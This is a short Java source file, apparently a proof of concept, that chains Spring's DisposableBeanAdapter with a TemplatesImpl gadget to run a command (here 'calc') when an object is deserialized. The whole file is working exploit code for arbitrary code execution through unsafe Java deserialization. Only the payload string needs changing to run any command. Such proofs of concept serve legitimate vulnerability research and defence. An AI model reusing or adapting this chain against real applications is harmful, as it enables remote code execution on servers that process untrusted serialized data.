package ses.poc.springbeans;

import ses.poc.Caller;
import ses.poc.Gadgets;
import ses.poc.SerializationUtils;

import java.lang.reflect.Constructor;
import java.util.List;

public class Main {

    public static void main(String[] args) throws Exception {

        Class<?> disposableBeanAdapterClass = Class.forName("org.springframework.beans.factory.support.DisposableBeanAdapter");
        Constructor ctor = disposableBeanAdapterClass.getDeclaredConstructor(Object.class, String.class, boolean.class,
                boolean.class, boolean.class, String.class, List.class);
        ctor.setAccessible(true);

        Runnable disposableBeanAdapter = (Runnable) ctor.newInstance(Gadgets.createTemplatesImpl("calc"),
                "TemplatesImpl", true, false, false, "newTransformer", null);

        Caller caller = new Caller(null);
        caller.runnable = disposableBeanAdapter;

        SerializationUtils.serializeDeserialize(caller);

    }

}
